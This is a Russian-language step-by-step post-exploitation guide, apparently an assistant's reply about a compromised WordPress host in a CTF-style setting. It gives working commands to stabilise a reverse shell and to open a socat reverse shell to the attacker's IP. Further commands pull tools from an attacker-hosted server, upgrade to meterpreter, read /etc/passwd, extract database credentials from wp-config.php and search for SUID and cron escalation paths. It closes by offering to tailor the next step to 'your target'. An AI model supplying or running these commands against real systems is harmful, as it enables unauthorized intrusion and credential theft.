# 1) Стабилизируй TTY

В твоём текущем реверсе выполни по очереди:

```bash
/bin/bash -i
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty -a            # на своей машине узнай rows/cols, напр. 48 160
stty rows 48 cols 160
```

Если с Ctrl-C беда:

```bash
stty raw -echo; fg   # затем Enter дважды
reset
```

Альтернатива (лучше, если есть `script`):

```bash
script -qc /bin/bash /dev/null
```

# 2) Сделай стабильный реверс (через socat)

Если на цели есть `socat`:

* На своей машине:

```bash
socat -d -d TCP-L:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
```

* На цели:

```bash
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ТВОЙ_IP>:4444
```

Если `socat` нет — залей статический бинарь (если исходящий HTTP разрешён): подними `python3 -m http.server` у себя и `curl/wget` с цели → `chmod +x` → как выше.

# 3) Переведи shell → meterpreter (аккуратно)

Если работаешь с Metasploit и уже есть обычный shell-сеанс, используй апгрейд:

```
msfconsole
use post/multi/manage/shell_to_meterpreter
set SESSION <id_твоего_shell_сеанса>
set LHOST <твой_ip>
set LPORT 5555
run
```

Это даст meterpreter без редактирования файлов темы.

# 4) Быстрая пост-эксплуатация (минимум)

```bash
id; uname -a; lsb_release -a 2>/dev/null || cat /etc/os-release
whoami; hostname -f
sudo -l
groups
cat /etc/passwd
```

Проверь, где ты:

```bash
cat /proc/1/cgroup | head
```

Если видишь docker-следы — ищи маунты/сокеты.

WP артефакты/креды:

```bash
cd /var/www/html 2>/dev/null || cd /var/www
grep -R "DB_NAME\|DB_USER\|DB_PASSWORD" -n wp-config.php */wp-config.php 2>/dev/null
ls -la wp-content/uploads/ 2>/dev/null
```

Если есть mysql-креды и сокет:

```bash
mysql --protocol=socket -S /var/run/mysqld/mysqld.sock -u <user> -p
```

SUID/Capabilities/cron:

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -la /etc/cron* /var/spool/cron 2>/dev/null
```

# 5) Поддержка доступа (без ломания init)

Самое «чистое» для CTF — держать socat-реверс/метерпитер и не трогать автозапуск. Если нужно — однократно прокидывай новый коннект из имеющегося шелла.

---

Если скажешь: «есть/нет python», «есть/нет socat», «shell\_to\_meterpreter отработал/нет» — подберу точный вариант под твою цель и окружение.
